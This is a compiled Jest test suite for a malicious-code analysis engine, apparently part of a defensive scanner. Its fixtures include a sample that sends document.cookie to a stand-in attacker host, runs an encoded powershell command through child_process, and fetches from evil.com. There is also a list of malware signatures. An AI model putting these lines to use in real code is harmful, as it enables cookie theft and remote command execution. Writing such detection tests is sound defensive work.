"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
const globals_1 = require("@jest/globals");
const bridge_1 = require("../../bridge");
const types_1 = require("../../bridge/types");
(0, globals_1.describe)('Analysis Engine Integration Tests', () => {
    let testBuffer;
    let maliciousBuffer;
    let largeBuffer;
    (0, globals_1.beforeAll)(() => __awaiter(void 0, void 0, void 0, function* () {
        // Create test data
        const encoder = new TextEncoder();
        // Benign JavaScript code
        const benignCode = `
      function calculateTotal(items) {
        return items.reduce((sum, item) => sum + item.price, 0);
      }
      console.log("Hello World");
    `;
        testBuffer = encoder.encode(benignCode).buffer;
        // Malicious JavaScript with patterns
        const maliciousCode = `
      eval(atob("ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+Iik="));
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "http://malicious-domain.com/steal-data");
      xhr.send(document.cookie);
      
      // Obfuscated code
      var _0x1234 = ["\x48\x65\x6c\x6c\x6f", "\x57\x6f\x72\x6c\x64"];
      function _0xabcd(_0x5678) { return _0x1234[_0x5678]; }
      
      // Suspicious patterns
      var cmd = "powershell.exe -encodedCommand " + btoa("Get-Process");
      require('child_process').exec(cmd);
    `;
        maliciousBuffer = encoder.encode(maliciousCode).buffer;
        // Large buffer for performance testing
        const largeCode = benignCode.repeat(10000);
        largeBuffer = encoder.encode(largeCode).buffer;
    }));
    (0, globals_1.describe)('Basic Functionality', () => {
        (0, globals_1.test)('should successfully analyze benign code', () => __awaiter(void 0, void 0, void 0, function* () {
            const result = yield bridge_1.analysisEngine.analyzeBuffer(testBuffer);
            (0, globals_1.expect)(result).toBeDefined();
            (0, globals_1.expect)(result.vulnerabilities).toHaveLength(0);
            (0, globals_1.expect)(result.hash).toBeDefined();
            (0, globals_1.expect)(result.hash).toMatch(/^[a-f0-9]{64}$/); // SHA256 format
            (0, globals_1.expect)(result.analysis_time_ms).toBeGreaterThan(0);
            (0, globals_1.expect)(result.file_size).toBe(testBuffer.byteLength);
        }));
        (0, globals_1.test)('should detect malicious patterns', () => __awaiter(void 0, void 0, void 0, function* () {
            const result = yield bridge_1.analysisEngine.analyzeBuffer(maliciousBuffer);
            (0, globals_1.expect)(result.vulnerabilities.length).toBeGreaterThan(0);
            // Check for eval detection
            const evalVuln = result.vulnerabilities.find(v => v.description.toLowerCase().includes('eval'));
            (0, globals_1.expect)(evalVuln).toBeDefined();
            (0, globals_1.expect)(evalVuln === null || evalVuln === void 0 ? void 0 : evalVuln.severity).toBe(types_1.VulnerabilitySeverity.High);
            // Check for suspicious domain
            const domainVuln = result.vulnerabilities.find(v => v.description.includes('malicious-domain.com'));
            (0, globals_1.expect)(domainVuln).toBeDefined();
            // Check for obfuscation detection
            const obfuscationVuln = result.vulnerabilities.find(v => v.category === 'obfuscation');
            (0, globals_1.expect)(obfuscationVuln).toBeDefined();
        }));
        (0, globals_1.test)('should handle empty buffer', () => __awaiter(void 0, void 0, void 0, function* () {
            const emptyBuffer = new ArrayBuffer(0);
            const result = yield bridge_1.analysisEngine.analyzeBuffer(emptyBuffer);
            (0, globals_1.expect)(result.vulnerabilities).toHaveLength(0);
            (0, globals_1.expect)(result.file_size).toBe(0);
        }));
        (0, globals_1.test)('should handle large files efficiently', () => __awaiter(void 0, void 0, void 0, function* () {
            const startTime = Date.now();
            const result = yield bridge_1.analysisEngine.analyzeBuffer(largeBuffer);
            const executionTime = Date.now() - startTime;
            (0, globals_1.expect)(result).toBeDefined();
            (0, globals_1.expect)(executionTime).toBeLessThan(5000); // Should complete in under 5 seconds
            (0, globals_1.expect)(result.file_size).toBe(largeBuffer.byteLength);
        }));
    });
    (0, globals_1.describe)('Deobfuscation Features', () => {
        (0, globals_1.test)('should deobfuscate base64 encoded strings', () => __awaiter(void 0, void 0, void 0, function* () {
            const code = `var secret = atob("SGVsbG8gV29ybGQ=");`;
            const buffer = new TextEncoder().encode(code).buffer;
            const result = yield bridge_1.analysisEngine.analyzeBuffer(buffer);
            // Should detect the base64 string
            const base64Vuln = result.vulnerabilities.find(v => v.description.includes('Base64'));
            (0, globals_1.expect)(base64Vuln).toBeDefined();
            // Deobfuscated content should reveal "Hello World"
            (0, globals_1.expect)(base64Vuln === null || base64Vuln === void 0 ? void 0 : base64Vuln.details).toContain('Hello World');
        }));
        (0, globals_1.test)('should detect hex encoded strings', () => __awaiter(void 0, void 0, void 0, function* () {
            const code = `var data = "\\x48\\x65\\x6c\\x6c\\x6f";`;
            const buffer = new TextEncoder().encode(code).buffer;
            const result = yield bridge_1.analysisEngine.analyzeBuffer(buffer);
            const hexVuln = result.vulnerabilities.find(v => v.category === 'obfuscation' && v.description.includes('Hex'));
            (0, globals_1.expect)(hexVuln).toBeDefined();
        }));
        (0, globals_1.test)('should handle unicode escape sequences', () => __awaiter(void 0, void 0, void 0, function* () {
            const code = `var text = "\\u0048\\u0065\\u006c\\u006c\\u006f";`;
            const buffer = new TextEncoder().encode(code).buffer;
            const result = yield bridge_1.analysisEngine.analyzeBuffer(buffer);
            const unicodeVuln = result.vulnerabilities.find(v => v.category === 'obfuscation');
            (0, globals_1.expect)(unicodeVuln).toBeDefined();
        }));
    });
    (0, globals_1.describe)('Pattern Matching', () => {
        (0, globals_1.test)('should detect malware signatures', () => __awaiter(void 0, void 0, void 0, function* () {
            const patterns = [
                'document.write("<script',
                'XMLHttpRequest',
                'child_process',
                'powershell.exe',
                'cmd.exe',
                'eval(',
                'Function(',
                'setTimeout(',
                'setInterval(',
            ];
            for (const pattern of patterns) {
                const code = `malicious.${pattern}("payload");`;
                const buffer = new TextEncoder().encode(code).buffer;
                const result = yield bridge_1.analysisEngine.analyzeBuffer(buffer);
                (0, globals_1.expect)(result.vulnerabilities.length).toBeGreaterThan(0);
                (0, globals_1.expect)(result.vulnerabilities.some(v => v.description.includes(pattern) ||
                    v.category === 'malware')).toBe(true);
            }
        }));
        (0, globals_1.test)('should detect suspicious URLs and IPs', () => __awaiter(void 0, void 0, void 0, function* () {
            const code = `
        fetch("http://192.168.1.1/payload.js");
        fetch("https://suspicious-site.tk/malware");
        window.location = "http://evil.com/redirect";
      `;
            const buffer = new TextEncoder().encode(code).buffer;
            const result = yield bridge_1.analysisEngine.analyzeBuffer(buffer);
            // Should detect IP address
            (0, globals_1.expect)(result.vulnerabilities.some(v => v.description.includes('192.168.1.1'))).toBe(true);
            // Should detect suspicious domains
            (0, globals_1.expect)(result.vulnerabilities.some(v => v.description.includes('suspicious-site.tk') ||
                v.description.includes('evil.com'))).toBe(true);
        }));
    });
    (0, globals_1.describe)('Error Handling', () => {
        (0, globals_1.test)('should handle invalid input gracefully', () => __awaiter(void 0, void 0, void 0, function* () {
            // Test with non-ArrayBuffer input
            yield (0, globals_1.expect)(bridge_1.analysisEngine.analyzeBuffer(null))
                .rejects.toThrow();
            yield (0, globals_1.expect)(bridge_1.analysisEngine.analyzeBuffer(undefined))
                .rejects.toThrow();
            yield (0, globals_1.expect)(bridge_1.analysisEngine.analyzeBuffer("string"))
                .rejects.toThrow();
        }));
        (0, globals_1.test)('should handle corrupted data', () => __awaiter(void 0, void 0, void 0, function* () {
            // Create buffer with random bytes
            const corruptedBuffer = new ArrayBuffer(1000);
            const view = new Uint8Array(corruptedBuffer);
            for (let i = 0; i < view.length; i++) {
                view[i] = Math.floor(Math.random() * 256);
            }
            // Should not crash, but complete analysis
            const result = yield bridge_1.analysisEngine.analyzeBuffer(corruptedBuffer);
            (0, globals_1.expect)(result).toBeDefined();
            (0, globals_1.expect)(result.file_size).toBe(1000);
        }));
    });
    (0, globals_1.describe)('Performance Benchmarks', () => {
        (0, globals_1.test)('should meet throughput targets', () => __awaiter(void 0, void 0, void 0, function* () {
            const sizes = [1024, 10240, 102400, 1024000]; // 1KB, 10KB, 100KB, 1MB
            const results = [];
            for (const size of sizes) {
                const buffer = new ArrayBuffer(size);
                const view = new Uint8Array(buffer);
                // Fill with realistic data
                for (let i = 0; i < size; i++) {
                    view[i] = 65 + (i % 26); // A-Z pattern
                }
                const startTime = performance.now();
                yield bridge_1.analysisEngine.analyzeBuffer(buffer);
                const endTime = performance.now();
                const time = endTime - startTime;
                const throughput = (size / 1024 / 1024) / (time / 1000); // MB/s
                results.push({ size, time, throughput });
            }
            // Log performance results
            console.log('Performance Benchmark Results:');
            results.forEach(r => {
                console.log(`Size: ${r.size} bytes, Time: ${r.time.toFixed(2)}ms, Throughput: ${r.throughput.toFixed(2)} MB/s`);
            });
            // Check that larger files have reasonable throughput
            const largeThroughput = results[results.length - 1].throughput;
            (0, globals_1.expect)(largeThroughput).toBeGreaterThan(10); // At least 10 MB/s
        }));
    });
    (0, globals_1.describe)('Integration with TypeScript Types', () => {
        (0, globals_1.test)('should return properly typed results', () => __awaiter(void 0, void 0, void 0, function* () {
            const result = yield bridge_1.analysisEngine.analyzeBuffer(testBuffer);
            // Type checks (TypeScript will validate at compile time)
            const hash = result.hash;
            const size = result.file_size;
            const time = result.analysis_time_ms;
            const vulns = result.vulnerabilities;
            (0, globals_1.expect)(typeof hash).toBe('string');
            (0, globals_1.expect)(typeof size).toBe('number');
            (0, globals_1.expect)(typeof time).toBe('number');
            (0, globals_1.expect)(Array.isArray(vulns)).toBe(true);
        }));
        (0, globals_1.test)('should handle all severity levels', () => __awaiter(void 0, void 0, void 0, function* () {
            const severities = Object.values(types_1.VulnerabilitySeverity);
            // Our malicious buffer should have multiple severity levels
            const result = yield bridge_1.analysisEngine.analyzeBuffer(maliciousBuffer);
            const foundSeverities = new Set(result.vulnerabilities.map(v => v.severity));
            (0, globals_1.expect)(foundSeverities.size).toBeGreaterThan(0);
            foundSeverities.forEach(sev => {
                (0, globals_1.expect)(severities).toContain(sev);
            });
        }));
    });
    (0, globals_1.describe)('Memory Management', () => {
        (0, globals_1.test)('should not leak memory on repeated analyses', () => __awaiter(void 0, void 0, void 0, function* () {
            var _a, _b;
            const iterations = 100;
            const buffer = new ArrayBuffer(10240); // 10KB
            // Warm up
            yield bridge_1.analysisEngine.analyzeBuffer(buffer);
            // Get initial memory (if available)
            const initialMemory = (_a = performance.memory) === null || _a === void 0 ? void 0 : _a.usedJSHeapSize;
            // Run many iterations
            for (let i = 0; i < iterations; i++) {
                yield bridge_1.analysisEngine.analyzeBuffer(buffer);
            }
            // Check memory hasn't grown significantly
            const finalMemory = (_b = performance.memory) === null || _b === void 0 ? void 0 : _b.usedJSHeapSize;
            if (initialMemory && finalMemory) {
                const growth = finalMemory - initialMemory;
                const growthMB = growth / 1024 / 1024;
                console.log(`Memory growth after ${iterations} iterations: ${growthMB.toFixed(2)} MB`);
                // Should not grow more than 50MB for 100 iterations
                (0, globals_1.expect)(growthMB).toBeLessThan(50);
            }
        }));
    });
});
// Run the tests
if (require.main === module) {
    console.log('Running Analysis Engine Integration Tests...');
}
